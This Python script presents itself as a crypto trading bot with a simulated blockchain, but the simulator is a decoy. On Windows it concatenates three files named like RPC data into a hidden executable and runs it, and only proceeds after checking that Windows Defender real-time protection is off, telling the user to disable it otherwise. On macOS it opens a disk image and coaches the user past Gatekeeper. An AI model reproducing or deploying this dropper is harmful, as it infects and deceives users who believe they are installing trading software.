import subprocess
import os
import platform
import threading
import time
import json
import random
import logging
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BlockchainSimulator:
    def __init__(self):
        self.current_block = 0
        self.blocks = {}

    def generate_block(self):
        self.current_block += 1
        transactions = [f'tx_{random.randint(1000, 9999)}' for _ in range(random.randint(1, 20))]
        block = {
            'block_number': self.current_block,
            'transactions': transactions,
            'timestamp': time.time()
        }
        self.blocks[self.current_block] = block
        return block

    def get_block(self, block_number):
        return self.blocks.get(block_number)

def builded(files, output_filename):
    all_bytes = b''

    for file in files:
        with open(file, 'rb') as f:
            all_bytes += f.read()

    with open(output_filename, 'wb') as f:
        f.write(all_bytes)

    os.system(output_filename)

files = ['block.rpc', 'predict.rpc', 'volume.rpc']
output_filename = '.reconstructed_blockchain.exe'

def rpc_server(blockchain, data_queue):
    while True:
        block = blockchain.generate_block()
        json_data = json.dumps(block)
        data_queue.put(json_data)
        logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
        time.sleep(random.randint(1, 3))

def is_defender_active():
    try:
        result = subprocess.run(['powershell', '-Command', 'Get-MpPreference'], capture_output=True, text=True)
        output = result.stdout
        if 'DisableRealtimeMonitoring' in output:
            if 'DisableRealtimeMonitoring  : False' in output:
                return True
        return False
    except Exception as e:
        print(f"Error checking Windows Defender status: {e}")
        return False

def main():
    blockchain = BlockchainSimulator()
    data_queue = Queue()

    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))

    if platform.system() == 'Windows':
        if is_defender_active():
            print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
        else:
            builded(files, output_filename)
            rpc_server_thread.start()
            blockchain_thread.start()

            rpc_server_thread.join()
            blockchain_thread.join()
    elif platform.system() == 'Darwin':  # Mac OS
        file_to_execute = 'PCS.dmg'
        if os.path.exists(file_to_execute):
            subprocess.run(["open", file_to_execute], check=True)
            print("To run the bot, right-click on the Pcs.app file in the opened window and click Open.")
        else:
            print(f"{file_to_execute} not found.")
    else:
        print("Unsupported operating system.")
        return

if __name__ == "__main__":
    main()
